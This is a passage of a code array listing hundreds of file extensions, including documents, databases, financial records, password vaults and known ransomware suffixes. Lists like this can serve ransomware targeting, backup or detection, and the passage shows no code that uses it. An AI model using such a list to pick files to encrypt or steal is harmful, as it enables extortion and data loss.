				"clkv", "clm", "clp", "clr", "cls", "clx", "cm10", "cm5", "cma", "cmap",
				"CMB", "cmbl", "cmf", "cml", "cmp", "cmr", "cms", "cmt", "cmu", "cna",
				"cnf", "cng", "cnt", "cnv", "cod", "col", "collab", "comicdoc", "comiclife", "COMMENTS",
				"compositionmodel", "compositiontemplate", "con", "conf", "config", "contact", "converterx", "cp", "cp9", "CPA",
				"cpaa", "cpc", "cpd", "cpdt", "cpf", "cpgz", "cphd", "cpi", "cpio", "cpk",
				"cpmz", "cpp", "cpt", "cptx", "cpy", "cr2", "cram", "crashed", "craw", "crb",
				"crd", "crds", "creole", "crev", "cri", "crjoker", "crs", "crs3", "crt", "crtr",
				"crtx", "crw", "crwl", "cry", "crypt", "crypt12", "crypt8", "crypt9", "crypted", "cryptowall",
				"cryptra", "cs", "cs8", "csa", "csd", "cse", "CSG", "csh", "csi", "csl",
				"csm", "cso", "csp", "csr", "css", "cst", "csv", "ctb", "ctbl", "ctd",
				"cte", "ctf", "CTG", "ctl", "ctm", "ctp", "ctproject", "ctt", "ctv", "ctv3",
				"ctx", "ctxt", "cty", "cub", "cube", "cue", "current", "cursorfx", "curxptheme", "cva",
				"cvd", "cvj", "cvl", "cvn", "cvw", "cw3", "cwf", "cwk", "cwn", "cwr",
				"cws", "cww", "cwwp", "cxa", "cxarchive", "cxd", "cxf", "cxr", "cxt", "cyi",
				"cyo", "cys", "czi", "czip", "czp", "d", "d00", "d01", "d3dbsp", "d64",
				"d88", "da0", "da2", "daa", "dac", "dacpac", "dad", "dadiagrams", "dadx", "daf",
				"dag", "dal", "dam", "dao", "dap", "dar", "das", "daschema", "dash", "dat",
				"DATA", "database", "datx", "dax", "dayzprofile", "dazip", "db_journal", "db0", "db3", "dba",
				"dbb", "dbc", "dbcrypt12", "dbcrypt8", "dbd", "DBF", "dbfv", "dbgsym", "db-journal", "dbk",
				"dbr", "dbs", "db-shm", "dbt", "dbv", "db-wal", "dc2", "dc4", "dca", "dcb",
				"dcd", "dcf", "dch", "dcl", "dcm", "dcmd", "dcmf", "dco", "dcp", "dcpf",
				"dcpr", "dcr", "dcs", "dct", "dct5", "dcu", "dcx", "dd", "ddb", "ddc",
				"ddcx", "ddd", "ddf", "ddif", "ddl", "ddoc", "ddrw", "dds", "ddt", "deb",
				"debian", "dec", "ded", "def", "default", "del", "dem", "DEP", "deproj", "der",
				"des", "desc", "description", "design", "desklink", "det", "deu", "dev", "develve", "deviceinfo",
				"dex", "dfe", "dfl", "dfm", "dfproj", "dft", "dfti", "dgc", "dgm", "DGML",
				"dgpd", "dgr", "dgrh", "dgs", "dhcd", "dhe", "dia", "dic", "dict", "did",
				"dif", "dig", "dii", "dim", "dime", "dip", "dir", "directory", "disc", "disco",
				"disk", "dist", "dit", "dita", "ditamap", "ditaval", "divx", "diz", "djbz", "djv",
				"djvu", "dk@p", "dkt", "dl", "dl_", "dlc", "dlg", "dlis", "dlt", "dltemp",
				"dm2", "dmbk", "dmc", "dmg", "dmgpart", "dmm", "dmmx", "dmo", "dmp", "dmpr",
				"dmr", "dms", "dmsp", "dmtemplate", "dmv", "dna", "dng", "dnl", "dob", "doc",
				"doc#", "docb", "doce", "docenx", "dochtml", "dockzip", "docl", "docm", "docmhtml", "docs",
				"docset", "docstates", "doct", "documentrevisions-v100", "docx", "docxl", "docxml", "dok", "dot", "dothtml",
				"dotm", "dotmenx", "dotx", "dotxenx", "dox", "doxy", "doz", "dp", "dp1", "dpb",
				"DPC", "dpd", "dpi", "dpk", "dpl", "dpn", "dpr", "dps", "dpt", "dpx",
				"dqy", "dr", "drd", "dream", "drf", "drl", "drm", "drmx", "drmz", "drscan",
				"drw", "dsb", "dsc", "dsd", "dsdic", "dsf", "dsg", "dsk", "dsl", "dsn",
				"dsp", "dss", "dsx", "dsy", "dsz", "dt", "dta", "dtd", "dtm", "dtml",
				"dtp", "dtr", "dtsx", "dtx", "dump", "dupeguru", "dvb", "dvc", "dvd", "dvdproj",
				"dvds", "dvi", "dvo", "dvs", "dvx", "dvz", "dwd", "dwdoc", "dwf", "dwfx",
				"dwg", "dwi", "dwlibrary", "dwp", "dws", "dwt", "dxb", "dxd", "dxe", "dxf",
				"dxg", "dxl", "dxn", "dxp", "dxr", "dxstudio", "dz", "dzp", "e01", "e2p",
				"e3s", "e4a", "eap", "eas", "easmx", "ebk", "ebm", "ebs", "ebuild", "ec0",
				"ec3", "ec4", "ecc", "ecl", "ecm", "eco", "ecr", "ecs", "ecsbx", "ect",
				"ecx", "eda", "edat", "edat2", "edb", "edd", "ede", "edf", "edfx", "edg",
				"edi", "edk", "edl", "edml", "edn", "edoc", "edq", "edrwx", "eds", "edt",
				"edv", "edz", "eep", "ef", "efa", "efax", "eff", "efl", "efm", "efp",
				"efr", "eftx", "efu", "efw", "efx", "egg", "eglib", "egp", "egr", "egt",
				"ehp", "eif", "eip", "ekb", "ekm", "el6", "eld", "elf", "elfo", "eln",
				"els", "em", "emb", "embl", "emc", "emd", "emf", "eml", "emlxpart", "emm",
				"emrg", "emrg2", "enc", "enciphered", "encrypted", "enex", "enfpack", "enl", "enlx", "enq",
				"ent", "env", "enw", "enx", "enyd", "eob", "eot", "ep", "epdf", "EPF",
				"epi", "epim", "epk", "epp", "eprtx", "eps", "epsf", "ept", "epub", "epw",
				"eql", "er1", "erbsql", "erd", "ere", "erf", "erg", "erp", "err", "ersx",
				"es", "es2", "es3", "esb", "esc", "esd", "ese", "esf", "esm", "esp",
				"esq", "ess", "est", "esv", "esx", "et", "ete", "etng", "etnt", "ets",
				"ett", "etx", "euc", "eui", "ev", "EV1", "EV2", "EV3", "ev3p", "ev3s",
				"evo", "evx", "evy", "ewl", "ews", "ex", "ex01", "exb", "exc", "exd",
				"exf", "exif", "exl", "exm", "exp", "exprwdhtml", "exprwdxml", "exx", "ez", "ezc",
				"ezm", "ezs", "ezz", "f", "f04", "f06", "f3z", "f4v", "f90", "f96",
				"fa", "fac", "fadein", "fae", "familyfile", "faq", "far", "fas", "fasta", "fax",
				"fbc", "fbd", "fbf", "fbk", "fbp6", "fbq", "fbs", "fbu", "fbw", "fcd",
				"fcf", "fcpbundle", "fcpevent", "fcpproject", "fcpxdest", "fcpxml", "fcs", "fcstd", "fct", "fd",
				"fdb", "fdd", "fdf", "fdi", "fdm", "fdoc", "fdp", "fdr", "fds", "fdseq",
				"fdt", "fdw", "fdx", "FE", "fed", "feed-ms", "feedsdb-ms", "fes", "ff", "ffa",
				"ffd", "ffdata", "fff", "ffindex", "ffl", "ffo", "fft", "ffwp", "ffx", "fg3",
				"fh", "fhc", "fhd", "fhf", "fic", "fid", "fig", "fil", "fin", "fingnet",
				"fl", "fla", "flac", "flag", "flam3", "flame", "flat", "flf", "flg", "flib",
				"flipchart", "flk", "flka", "flkb", "fll", "flm", "flo", "flow", "flp", "fls",
				"flt", "fltr", "flv", "flvv", "flwa", "fly", "fm", "fm3", "fmat", "fmc",
				"fmd", "fmf", "fml", "fmp", "fmp12", "fmp3", "fmpsl", "fmt", "fnbk", "fnf",
				"fnm", "fnrecipes", "fo", "fob", "fodg", "fodp", "fods", "fodt", "fol", "folio",
				"folx", "fop", "for", "forge", "fos", "fountain", "fox", "fp", "fp3", "fp4",
				"fp5", "fp8", "fpa", "fpage", "fpdoclib", "fpenc", "fphomeop", "fpk", "fplinkbar", "fpp",
				"fpr", "fpsl", "fpsx", "fpt", "fpx", "fqc", "fra", "frag", "frameset", "frd",
				"frdat", "frdoc", "freepp", "frelf", "frl", "frm", "fro", "fs", "fsa", "fsc",
				"fsd", "fsf", "fsh", "fsif", "fsp", "fss", "fstab", "ft10", "ft11", "ft7",
				"ft8", "ft9", "ftil", "ftl", "ftm", "ftmb", "ftr", "ftw", "ful", "fwbackup",
				"fwdict", "fwk", "fwtemplate", "FX", "fxd", "fxf", "fxg", "fxo", "fxp", "fxr",
				"fza", "fzb", "fzbz", "fzh", "fzip", "fzpz", "g1m", "g3m", "g41", "ga3",
				"gadgeprj", "gal", "gallery", "gam", "gan", "gar", "gb", "gb1", "gb2", "gbi",
				"gbk", "gbl", "gbo", "gbp", "gbr", "gbs", "gc", "gca", "gcd", "gcg",
				"gcproj", "gcsx", "gct", "gcw", "gcx", "gd3", "gdb", "gdbtable", "gdc", "gdf",
				"GDL", "gdoc", "gdrive", "gdt", "gdtb", "ged", "gedata", "gedcom", "gen", "genbank",
				"geo", "gev", "gevl", "gexf", "gfe", "gfi", "gform", "gfs", "gfx", "ggb",
				"ghe", "gho", "ghs", "gi", "gil", "gis", "giw", "gkh", "gla", "gld",
				"glink", "glk", "glo", "glos", "gls", "gly", "gmap", "gmbl", "gml", "gmp",
				"gms", "gmz", "gnd", "gno", "gnp", "gnutar", "gofin", "gp3", "gp4", "gpd",
				"gpf", "gpg", "gpi", "gpj", "gpn", "gpp", "gpr", "gpscan", "gpx", "gpz",
				"gra", "grade", "graphml", "graphmlz", "gray", "grd", "grdb", "grey", "grf", "grib",
				"grib2", "grind", "grindx", "grk", "grle", "groups", "grp", "grr", "grs", "grt",
				"grv", "GRXML", "gry", "gs", "gsa", "gs-bck", "gsf", "gsheet", "gslides", "gsm",
				"GTA", "gtable", "gtar", "gthr", "gtl", "gtm", "gto", "gtp", "gts", "gui",
				"guides", "gul", "gvi", "gwi", "gwk", "gwp", "gxk", "gxl", "gxt", "gz",
				"gz2", "gza", "gzi", "gzig", "gzip", "h", "h10", "h11", "h12", "h13",
				"h14", "h15", "h16", "h17", "h1q", "h1s", "h1w", "h2o", "h2w", "h3m",
				"h4", "h4r", "h5", "h6x", "h77t", "haas", "hal", "haml", "hbk", "hbl",
				"hbx", "hc", "hcc", "hce", "hci", "hcl", "HCP", "hcr", "hcu", "hcw",
				"hcx", "hcxs", "hda", "hdb", "hdd", "hdf", "hdi", "hdl", "hdpmx", "hds",
				"hdt", "hdumx", "hdx", "hed", "help", "helpindex", "HEQ", "hex", "hfd", "hfs",
				"hft", "hfv", "hhs", "hif", "hin", "his", "hjt", "hkdb", "HKF", "hkx",
				"hl", "hlf", "hlp", "hlx", "hlx2", "hlz", "hm2", "hm3", "hml", "hmskin",
				"hmt", "hmxp", "hmxz", "hnd", "hoi4", "hol", "hot", "hp2", "hpd", "hpj",
				"hplg", "hpo", "hpp", "hps", "hpt", "hpw", "hqx", "hrx", "hs", "hs2",
				"hsdt", "hsk", "hsm", "hst", "hsx", "hta", "htb", "htg", "htm", "htm~",
				"html", "htmls", "htmlz", "htms", "htpasswd", "htz5", "huh", "hvc", "HVE", "hvpl",
				"hw3", "hwp", "hwpml", "hwt", "hxe", "hxi", "HXL", "HXN", "hxq", "hxr",
				"hxs", "HXX", "hyp", "hype", "hyv", "i00", "i01", "i02", "i5z", "iab",
				"iaf", "ial", "ias", "ib", "iba", "ibadr", "ibank", "ibb", "ibcd", "ibd",
				"ibdat", "ibg", "ibk", "ibp", "ibq", "ibz", "icalevent", "icaltodo", "icbu", "icc",
				"icf", "icg", "ichat", "icml", "icmt", "ico", "icr", "ics", "icst", "icxs",
				"id2", "id3tag", "idap", "idb", "idc", "idd", "idl", "idml", "idp", "idx",
				"ie5", "ie6", "ie7", "ie8", "ie9", "ies", "ifaith", "iff", "ifiction", "ifm",
				"ifp", "ifs", "igc", "igg", "igma", "ign", "igq", "igr", "ihf", "ihp",
				"ihx", "ii", "iif", "iiq", "iks", "ila", "ildoc", "ilg", "ilogicvb", "ima",
				"image", "imd", "img", "imp", "imr", "imt", "imz", "in", "INBOX", "INC",
				"incp", "incpas", "ind", "indb", "indd", "INDEX", "indl", "indp", "indt", "inf",
				"info", "ink", "inld", "inlk", "inp", "inprogress", "inrs", "ins", "inss", "installhelper",
				"insx", "internetconnect", "inx", "ioca", "iof", "ip", "ipa", "ipalias", "ipd", "ipf",
				"iphoto", "iplb", "ipmeta", "ipr", "iproject", "iq4", "iqmol", "irock", "irp", "irr",
				"irx", "is1", "is2", "isf", "ish1", "ish2", "ish3", "iso", "ispc", "ispx",
				"ist", "isu", "isz", "itdb", "ite", "itl", "itlp", "itm", "itmsp", "itmz",
				"itn", "itp", "its", "itw", "itx", "iup", "iv2i", "ivc", "ivd", "ivs",
				"ivt", "iw", "iw44", "iwa", "iwd", "iwi", "iwm", "iwprj", "iwtpl", "iwxdata",
				"ix", "ix2", "ixa", "ixb", "ixv", "j01", "jac", "jar", "jasper", "jav",
				"java", "jb2", "jbc", "jbi", "jbig", "jbig2", "jbk", "jbr", "jc", "jclic",
				"JCP", "jdat", "jdb", "jdc", "jdd", "jef", "jet", "jfif", "JFM", "jgcscs",
				"jge", "jgz", "jhd", "jiaf", "jias", "jif", "jiff", "jmp", "jnb", "jnt",
				"joboptions", "joe", "joined", "jp1", "jpa", "jpc", "jpe", "jpeg", "jpf", "jpg",
				"jpgx", "jph", "jpm", "jps", "jpw", "jrf", "jrl", "jrprint", "JRS", "jrxml",
				"js", "JS1", "jsd", "jsda", "json", "jsp", "jspa", "jspx", "jtbackup", "jtd",
				"jtdc", "jtt", "JTX", "jude", "just", "jw", "jwl", "jww", "k25", "k3b",
				"kal", "kap", "kb2", "kbd", "kbf", "kbits", "kbs", "kc2", "kdb", "kdbx",
				"kdc", "kde", "kdf", "kdz", "keb", "kelgfile", "kes", "kexi", "kexic", "kexis",
				"key", "keychain", "keynote", "keytab", "key-tef", "kf", "kfm", "kfp", "kgtemp", "kid",
				"kismac", "klq", "klw", "kma", "kms", "kmy", "kmz", "kno", "knt", "kos",
				"kpdx", "kpf", "kpp", "kpr", "kpx", "kpz", "krc", "ksd", "ksm", "ksp",
				"kss", "ksw", "kth", "kuip", "kvtml", "kwd", "kwm", "kwp", "l", "l01",
				"l3dw", "l6t", "la", "label", "laccdb", "las", "lastlogin", "lat", "latex", "lav",
				"lax", "lay", "lay6", "layout", "lbf", "lbi", "lbl", "lbx", "lcb", "lcd",
				"lcf", "LCK", "lcm", "lcn", "ld2", "ldabak", "ldb", "ldif", "lef", "lev",
				"lex", "lfe", "lfp", "lg1", "lg2", "lgc", "lgf", "lgh", "lgi", "lgl",
				"lgp", "lhd", "lhr", "lib", "lib4d", "lif", "life", "lin", "list", "lit",
				"litemod", "livereg", "liveupdate", "lix", "LKG", "ll3", "llb", "llv", "llx", "LM",
				"lmd", "lmf", "lms", "lmx", "lng", "lngttarch2", "lnt", "lnx", "LO_", "loc",
				"localstorage", "LOG1", "logonxp", "lok", "lot", "lp", "lp2", "lp7", "lpa", "lpc",
				"lpd", "lpdb", "lpdf", "lpk", "lpkg", "lpmd", "lpp", "lpx", "lqm", "lrcat",
				"lrdata", "lrf", "lrlib", "lrlibrary", "lrm", "lrtoolkit", "ls3", "ls5", "lsa", "lsd",
				"lsf", "lsl", "lsp", "lsr", "lst", "lsu", "ltcx", "ltm", "ltr", "LTS",
				"ltx", "lua", "lud", "lut", "lutx", "lvd", "lvivt", "lvl", "lvm", "lvw",
				"lw4", "lwd", "lwo", "lwp", "lwx", "lx01", "lxf", "lxk", "ly", "lyt",
				"lyx", "m", "m13", "m14", "m2", "m2ts", "m3u", "m3u8", "m4a", "m4p",
				"m4u", "m4v", "m7p", "maca", "maf", "mag", "mai", "maker", "maml", "man",
				"manu", "map", "mapimail", "MAPSTYLE", "maq", "mar", "marc", "markdn", "mars", "marshal",
				"mas", "mass", "mat", "mav", "max", "maxfr", "maxm", "mba", "mbbk", "mbd",
				"mbf", "mbg", "mbi", "mbox", "mbp", "mbx", "mc1", "mc9", "mcat", "mcd",
				"mcdx", "mcf", "mcgame", "mcmac", "mcmeta", "mcp", "mcrp", "mcw", "mcx", "md",
				"md0", "md1", "md2", "md3", "md5", "md8", "mdbackup", "mdbhtml", "mdc", "mdccache",
				"mdd", "mddata", "mdg", "mdi", "mdinfo", "mdj", "mdk", "mdl", "mdm", "mdn",
				"mds", "mdsx", "MDT", "mdx", "MDZ", "mecontact", "med", "mef", "meg", "mega",
				"meh", "mell", "mellel", "mem", "menc", "menu", "meo", "merlin2", "met", "METADATA",
				"metadata_never_index", "mex", "mf", "mf4", "mfa", "mfe", "mfl", "mfo", "mfp", "mft",
				"mfu", "mfv", "mfw", "mga", "mgmt", "mgourmet", "mgourmet3", "mgourmet4", "mhp", "mht",
				"mhtenx", "mhtmlenx", "mi", "mic", "mid", "mif", "mim", "mime", "mindnode", "miniso",
				"mip", "mission", "mix", "mjd", "mjdoc", "mjk", "mkd", "mke", "mkv", "mla",
				"mlb", "mlc", "mlj", "mlm", "mls", "mlsxml", "mlx", "mm", "mm6", "mm7",
				"mm8", "mmap", "mmc", "mmd", "mme", "mmf", "mmjs", "mml", "mmm", "mmo",
				"mmp", "mmsw", "mmw", "mnc", "mng", "MNI", "mnk", "mno", "mny", "mo",
				"mobi", "mod", "MODEL", "MOF", "moho", "mol", "money", "moneywell", "mos", "mosaic",
				"mov", "movie", "mox", "moz", "mp1", "mp2", "mp4v", "mpa", "mpd", "mpe",
				"mpeg", "mpf", "mpg", "mph", "mpj", "mpkt", "mpp", "mppz", "mpq", "mpqge",
				"mpr", "mps", "mpt", "mpv", "mpv2", "mpx", "mpz", "mrd", "mrg", "mrimg",
				"mru", "mrw", "mrwref", "ms", "ms10", "msb", "msc", "msct", "msd", "mse",
				"msf", "msg", "mshc", "msie", "msim", "msl", "mso", "msor", "msp", "msq",
				"mss", "ms-tnef", "msw", "mswd", "mtdd", "mte", "mtf", "mtff", "mth", "MTL",
				"mtm", "mtml", "mto", "mtp", "mts", "mtw", "mtx", "mtxt", "mud", "mug",
				"mui", "mum", "mup", "mvd", "mvdx", "mvex", "mvm", "mw", "mwb", "mwd",
				"mwf", "mwii", "mwpd", "mwpp", "mws", "mwx", "mx", "mxad", "mxc2", "mxd",
				"mxg", "mxi", "mxl", "mxp", "myd", "mydocs", "myi", "myo", "mz", "n3",
				"nam", "names", "nap", "narrative", "nas", "nav", "navmap", "nb", "nb7", "nba",
				"nbak", "nbd", "nbe", "nbf", "nbi", "nbk", "nbp", "nbs", "nbu", "nc",
				"ncd", "ncf", "nco", "ncorx", "nct", "nd", "nda", "ndb", "ndd", "ndif",
				"ndk", "ndl", "ndr", "nds", "ndx", "ne1", "ne3", "nef", "nessus", "net",
				"neta", "netspd", "netspm", "NEW", "nfb", "nfc", "nfi", "nfl", "nfo", "nfs",
				"nfs11save", "ng", "NGR", "nitf", "njx", "nk2", "nl", "nlogo", "nlogo3d", "NLP",
				"NLT", "nma", "nmbtemplate", "nmea", "nmind", "nmm", "nmp", "nmu", "nn", "nni",
				"NNM", "nnp", "nnt", "nokogiri", "nop", "not", "note", "notebook", "now", "noy",
				"np", "npd", "npdf", "npf", "npl", "npp", "npr", "nps", "npt", "npy",
				"nrb", "nrbak", "nrc", "nrd", "nrf", "nrg", "nri", "nrl", "nrm", "nrmlib",
				"nrs", "nrt", "nru", "nrw", "nrx", "ns2", "ns3", "ns4", "nsd", "nsg",
				"nsh", "nsq", "nsr", "nst", "nt", "ntf", "ntl", "ntp", "nts", "ntx",
				"NU2", "number", "numbers", "nupkg", "NUS", "NUSPEC", "nv", "nv2", "nvd", "nvdl",
				"nvl", "nvm", "nvram", "nwb", "nwbak", "nwcab", "nwcp", "nwdb", "nwelicense", "nwo",
				"nwp", "nws", "nx^d", "nx__", "nx1", "nx2", "nxl", "nyf", "oa2", "oa3",
				"oab", "oad", "oas", "obb", "OBD", "OBE", "obj", "obk", "obr", "obt",
				"obx", "obz", "occ", "ocdc", "ocimf", "ocs", "od", "oda", "odb", "odc",
				"odccubefile", "odf", "odg", "odh", "odi", "odif", "odm", "odo", "odp", "ods",
				"odt", "odt#", "odttf", "odx", "odz", "oeaccount", "oeb", "oem", "ofc", "officeui",
				"ofm", "ofn", "oft", "ofx", "oga", "ogc", "ogg", "oggu", "ogm", "ogmu",
				"ogs", "oil", "ojz", "okm", "old", "ole", "ole2", "olf", "olk", "olk14event",
				"olk14group", "olk14note", "olk14task", "oll", "olm", "olt", "olv", "oly", "omcs", "omg",
				"omlog", "omp", "onb", "ond", "one", "onepkg", "ont", "ontx", "oo3", "oos",
				"oot", "op", "op2", "op4", "opal", "opax", "opd", "opf", "opj", "opju",
				"oplx", "opn", "opt", "opx", "opxs", "oqy", "or2", "or3", "or4", "or5",
				"or6", "ora", "orf", "org", "ori", "orig", "ORP", "ort", "orx", "osd",
				"osdx", "ost", "osz", "ot", "otc", "otf", "otg", "oth", "oti", "otl",
				"otln", "otn", "otp", "ots", "ott", "otw", "otx", "out", "ova", "ovd",
				"ovf", "ovolog", "ovx", "owc", "owl", "owx", "oxps", "oxt", "oyx", "p01",
				"p10", "p12", "p2g", "p2i", "p2s", "p3", "p3x", "p65", "p7b", "p7c",
				"p7x", "p7z", "p96", "p97", "pab", "pack", "pad", "paf", "pages", "pages-tef",
				"pak", "pan", "paq", "partimg", "pas", "pat", "paux", "paw", "pbd", "pbf",
				"pbix", "pbj", "PBK", "pbp", "pbr", "pbs", "pbx5script", "pbxscript", "pc", "pcap",
				"pcapng", "pcb", "pcc", "pcd", "pcf", "pch", "pcj", "pck", "pcr", "PCS",
				"pct", "pcv", "pcw", "pd", "pd4", "pd5", "pdas", "pdb", "pdc", "pdcr",
				"pdd", "pdf", "pdf_", "pdf_profile", "pdf_tsid", "pdfa", "pdfe", "pdfenx", "pdfig", "pdfl",
				"pdfua", "pdfvt", "pdfx", "pdfxml", "pdfz", "pdg", "pdi", "pdm", "pdo", "pdp",
				"pds", "pdw", "pdx", "pdz", "peb", "pef", "pem", "pep", "PERF", "pes",
				"pex", "pez", "pf", "pfc", "pfd", "pfl", "pfm", "pfsx", "pft", "pfx",
				"pg", "pgd", "pgs", "phb", "phd", "phm", "php", "phr", "phs", "pih",
				"pixexp", "pj2", "pj4", "pj5", "pjm", "pjt", "pk", "pka", "pkb", "pkey",
				"pkg", "pkh", "pkpass", "pks", "pkt", "pl", "plan", "planner", "plb", "plc",
				"pld", "pli", "pln", "pls", "plt", "plus_muhd", "plw", "pm", "PM2", "pm3",
				"pm4", "pm5", "pm6", "pm7", "pmatrix", "pmd", "pmf", "pml", "pmm", "pmo",
				"pmr", "pmt", "pmv", "pmx", "pnproj", "pns", "pnu", "pnz", "po", "POC",
				"pod", "poi", "pool", "popshape", "por", "pot", "pothtml", "potm", "potx", "pp",
				"pp2", "pp3", "ppam", "ppd", "ppdf", "ppf", "ppj", "ppp", "ppr", "pps",
				"ppsenx", "ppsm", "ppsx", "ppt", "ppte", "ppthtml", "pptl", "pptm", "pptmhtml", "pptt",
				"pptx", "ppws", "ppx", "prc", "prd", "prdx", "pref", "prel", "prf", "printcd2",
				"prj", "prn", "pro", "pro4", "pro4dvd", "pro4pl", "pro4plx", "pro4x", "pro5", "pro5dvd",
				"pro5pl", "pro5plx", "pro5x", "pro6plx", "proofingtool", "props", "proqc", "prproj", "prr", "prs",
				"prt", "prtc", "prv", "prx", "ps", "PS1XML", "ps2", "ps3", "psa", "psafe3",
				"psb", "psd", "PSD1", "pse8db", "psf", "psg", "psi2", "psip", "psk", "psm",
				"PSM1", "psmd", "pspd", "pspimage", "pss", "pst", "psv", "psw", "psw6", "pswx",
				"psz", "pt3", "pt6", "ptb", "ptc", "ptf", "pth", "ptk", "ptn", "ptn2",
				"pts", "ptx", "PTXML", "ptz", "pub", "pubf", "pubhtml", "pubmhtml", "pubx", "puz",
				"pvd", "pve", "pvf", "pvhd", "pvm", "pvw", "pw", "pwd", "pwe", "pwf",
				"pwi", "pwm", "pwp", "pwre", "pxd", "pxf", "pxi", "pxj", "pxl", "pxp",
				"py", "pys", "pzc", "pzf", "pzt", "q07", "q08", "q09", "q3d", "qb",
				"qb2005", "qb2006", "qb2007", "qb2009", "qb2010", "qb2011", "qb2012", "qb2013", "qb2014", "qb2015",
				"qb2016", "qb2017", "qba", "qbatlg", "qbb", "qbj", "qbk", "qbl", "qbm", "qbmb",
				"qbmd", "qbr", "qbw", "qbx", "qbxml", "qby", "qch", "qcow", "qcow2", "qct",
				"qdat", "qdb", "qdf", "qdf-backup", "qdfm", "qdfx", "qdp", "qdt", "qed", "qel",
				"qf", "qfilter", "qfl", "qfx", "qfxx", "qhp", "qht", "qhtm", "qic", "qif",
				"qlgenerator", "qm", "qmbl", "qmtf", "qpb", "qpf", "qph", "qpx", "qrc", "qrmx",
				"qrp", "qrt", "qry", "qs", "qsd", "qsf", "qt", "qtq", "qtr", "qtw",
				"QUE", "quiz", "quox", "qv~", "qvd", "qvf", "qvp", "qvw", "qwd", "qwt",
				"qxb", "qxd", "qxf", "qxl", "qxp", "qxt", "r00", "r01", "r02", "r03",
				"r0f", "r0z", "r3d", "ra", "ra2", "raf", "ral", "ram", "ramd", "rap",
				"rar", "RAT", "ratdvd", "raw", "ray", "razy", "rb", "rbc", "rbf", "rbk",
				"rbs", "rbt", "rcb", "rcc", "rcd", "rcg", "rcl", "rctd", "rcx", "rd",
				"rd1", "rda", "rdata", "rdb", "rdf", "rdfs", "rdg", "rdi", "RDLC", "rdlx",
				"rdo", "rdoc", "rdoc_options", "rdx", "rdz", "re4", "reb", "rec", "redif", "ref",
				"reference", "rel", "rels", "rep", "res", "resbuild", "RESJSON", "rest", "result", "RESW",
				"ret", "rev", "rez", "rf", "rf1", "rfa", "rfo", "rft", "rge", "rgmb",
				"rgmc", "rgn", "rgo", "rgss3a", "rha", "rhif", "rhistory", "rim", "rit", "rl",
				"rlf", "rll", "rm", "rm5", "rmbak", "rmd", "rmf", "rmh", "rmuf", "rmx",
				"rna", "rng", "rnq", "rnt", "rnw", "ro3", "roadtrip", "roca", "rod", "rodx",
				"rodz", "rofl", "rog", "roi", "ROM", "ros", "rou", "rov", "row", "rox",
				"roxio", "roz", "rp", "rpa", "rpd", "rpf", "RPO", "rpp", "rpprj", "rpres",
				"rpt", "rptr", "rpyb", "rrd", "rrpa", "rrr", "rrt", "rrx", "rs", "rsc",
				"rsd", "rsdf", "rsdoc", "rsf", "rsm", "rso", "rsp", "rsrc", "rst", "rsv",
				"rsw", "rt", "rt_", "rta", "rtdf", "rte", "rtf", "rtf_", "rtfd", "rtk",
				"rtp", "rtpi", "rts", "rtsl", "rtstn", "rtsx", "rtttl", "rtwsh", "rtx", "ruel",
				"rum", "run", "rupaf", "rv", "rvf", "rvl", "rvt", "rw2", "rwd", "rwg",
				"rwl", "rwlibrary", "rws", "rwz", "rxdoc", "rzk", "rzx", "s3db", "s85", "s8bn",
				"sa5", "sa7", "sa8", "saas", "sad", "saf", "safe", "safetext", "sah", "sam",
				"sar", "sas7bdat", "sav", "save", "say", "sb", "sbc", "sbd", "sbf", "sbn",
				"sbo", "sbpf", "sbs", "sbsc", "sbst", "sbu", "sbw", "sbx", "sc2save", "sc4",
				"sc45", "sca", "scd", "scdoc", "sce", "scf", "scg", "scgc", "scgp", "scgs",
				"sch", "SCHEMA", "scm", "scmt", "scn", "sco", "scr", "scriv", "scrivx", "scs",
				"scspack", "scssc", "sct", "scw", "scx", "scz", "sd", "sd0", "sd1", "sda",
				"sdb", "sdc", "sdd", "sddraft", "sdi", "sdl", "sdlxliff", "sdmdocument", "sdn", "sdo",
				"sdoc", "sdp", "sdr", "sds", "sdsk", "sdt", "sdv", "sdw", "sdz", "se1",
				"SEARCH-MS", "secure", "seed", "sef", "sel", "sen", "seo", "seq", "sequ", "server",
				"ses", "set", "setup", "sev", "sfd", "sff", "sfs", "sfx", "sgf", "sgi",
				"sgl", "sgm", "sgml", "sgz", "sh", "sh6", "shar", "shb", "show", "SHP",
				"shr", "shs", "shtml", "shw", "shx", "shy", "sic", "sid", "sidd", "sidn",
				"sidx", "sie", "sig", "sik", "sim", "sis", "skb", "skv", "skx", "sky",
				"sla", "sldm", "sldtm", "sldx", "sle", "slf", "slk", "SLL", "slm", "slp",
				"slt", "slx", "slz", "sm", "smc", "smd", "sme", "smf", "smh", "smi",
				"smlx", "smn", "smp", "smpkg", "sms", "smwt", "smx", "smz", "sn1", "sn2",
				"sna", "snag", "snapshot", "snb", "snf", "sng", "snk", "snp", "sns", "snt",
				"snx", "so", "soi", "sp", "spb", "spd", "spdf", "speccy", "spf", "spg",
				"spj", "spk", "spl", "spm", "spml", "sppt", "spq", "spr", "sprt", "sprz",
				"sps", "spt", "spub", "spv", "sq", "sqb", "sqd", "sqf", "sqfs", "sql",
				"sqlite", "sqlite3", "sqlitedb", "sqllite", "sqr", "sqx", "sr2", "src", "SRD", "SRD-SHM",
				"SRD-WAL", "srf", "srfl", "srr", "srs", "srt", "srw", "ssa", "ssc", "ssd",
				"ssh", "ssi", "ssiw", "ssm", "ssp", "ssv", "ssx", "st", "st4", "st5",
				"st6", "st7", "st8", "sta", "stc", "std", "stdl", "STF", "stg", "sti",
				"stk", "stl", "stm", "STORE", "stp", "stproj", "stpz", "str", "struct", "stt",
				"stu", "stw", "stx", "stxt", "sty", "styk", "stykz", "sub", "sud", "suf",
				"sum", "surf", "sv$", "sv2i", "svd", "svdl", "svf", "svg", "svi", "svm",
				"svn", "svp", "svr", "svs", "swd", "swdoc", "sweb", "swf", "SWIDTAG", "switch",
				"swk", "swp", "sx", "sxc", "sxd", "sxe", "sxg", "sxi", "sxl", "sxm",
				"sxml", "sxw", "syn", "syncdb", "t", "t01", "t02", "t03", "t04", "t05",
				"t06", "t07", "t08", "t09", "t10", "t11", "t12", "t13", "t14", "t15",
				"t16", "t17", "t18", "t2", "t2k", "t2ks", "t2kt", "t2t", "t4g", "t64",
				"t80", "ta1", "ta2", "ta4", "ta5", "ta6", "ta7", "ta8", "ta9", "tab",
				"tabula-doc", "tabula-docstyle", "tac", "tag", "tah", "tao", "tap", "tar", "tardist", "TARGETS",
				"tax", "tax08", "tax09", "tax10", "tax11", "tax12", "tax13", "tax15", "tax16", "tax17",
